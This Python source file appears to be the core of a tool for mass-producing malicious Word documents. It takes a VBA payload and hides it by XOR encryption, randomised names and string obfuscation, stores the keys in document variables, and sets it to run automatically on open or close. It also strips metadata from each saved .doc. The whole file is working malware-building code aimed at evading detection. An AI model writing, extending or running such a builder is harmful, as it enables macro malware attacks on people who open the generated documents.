import sys
sys.dont_write_bytecode = True
import win32com.client, os
from const import *
from inc.classes import *
from ctypes import *
from _winreg import *

def return_file_type(template_file):
    if os.path.isfile(template_file) == False:
        raise Info(template_file + " was not found.", 0)

    filename, file_extension = os.path.splitext(template_file)
    if file_extension == ".doc":
        Info(file_extension + " detected", 0, 0)
        return file_extension
    else:
        raise Info(file_extension +" is not a supported extension.", 0)
    return Container


def open_file(filepath, right):
    try:
        open_file = open(filepath, right)
    except:
        Info(filepath+ " was not found, please check if the path is correct and/or read access",3)
    return open_file


def file_len(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

def main():
    file_type = return_file_type(template_file)

    filenames = open_file(filename_list, "r")
    Info("Valid filename_list, "+str(file_len(filename_list)) +" "+file_type+" will be generated", 0, 0)
    vb = open_file(original_vba_file, "r")
    vba_str = vb.read()
    Info(original_vba_file+ " will be obfuscated and integrated in created documents", 0, 0)


    for filename in filenames:
        #Opening and working with office document.
        filename = filename.rstrip('\n\r')
        Info("Creating "+filename + file_type, 0,1)

        if file_type == ".doc":
            Office_container = WordObject()

        if encryption_type == "xor":
            Info("XOR encrypton was selected", 0, 2)
            vba = Enc_VBA_XOR(vba_str, trigger_function_name)
        else:
            raise Info(encryption_type+ " is not supported yet, feel free to code it :-)",3)

        Info("Randomizing variable and function names", 0, 2)
        vba.randomize_var()

        Info("Obfuscation of strings", 0, 2)
        vba.obfuscate_string()

        Info("Hiding strings from python script",0,2)
        vba.hide_string()

        Office_container.Open(template_file)
        VBA_Func = VBA_Functions()
        #Adding keys :
        if key_hiding_method == "doc_variable":
            Info("Using Document.Variables method for hiding ciphering keys",0,2)
            Office_container.AddVba(VBA_Func.generate_generic_store_function("ActivateKey", vba.key_name, vba.key), "tmp")
            Office_container.RunMacro("ActivateKey")
            Office_container.DeleteVbaModule("tmp")

            if auto_function_macro == "onClose":
                Info("onClose auto-action was chosen, add trick to bypass first closing of the document : ",0,2)
                Office_container.AddVba(VBA_Func.generate_generic_store_function("OncloseKey", trigger_close_test_name, trigger_close_test_value), "tmp2")
                Office_container.RunMacro("OncloseKey")
                Office_container.DeleteVbaModule("tmp2")
                #Wrapping function

            elif auto_function_macro == "onOpen":
                Info("onOpen auto-action was chosen ",0,2)
            else:
                raise Info(auto_function_macro+ " is not supported yet, feel free to code it :-)",3)

            Info("Wrapping triggering function with auto_function_macro", 0,2)
            final_vba = Office_container.generate_trigger_function(vba, auto_function_macro)
           
            Info("Removing VBA style",0,2)
            final_vba = VBA_Func.remove_style(final_vba)

            Office_container.AddVba(final_vba)

            Info("Removing all metadatas from file", 0,2)
            Office_container.Remove_Metadata()

            Info("Saving doc.", 0,2)
            Office_container.Save(path_gen_files + "\\" + filename, file_type)
        else:
            raise Info(key_hiding_method+ " is not supported yet, feel free to code it :-)",3)

        Office_container.Close()
        Office_container.Quit()
        del Office_container
        del vba
        Info("File "+filename + file_type+" was created succesfuly",1,1)

    print "\n"
    Info("Good, everything seems ok, "+str(file_len(filename_list)) +" "+file_type+" files were created in "+path_gen_files+" using "+encryption_type+" encyption with "+key_hiding_method+" hiding technic", 1,0)

if __name__ == "__main__": main()
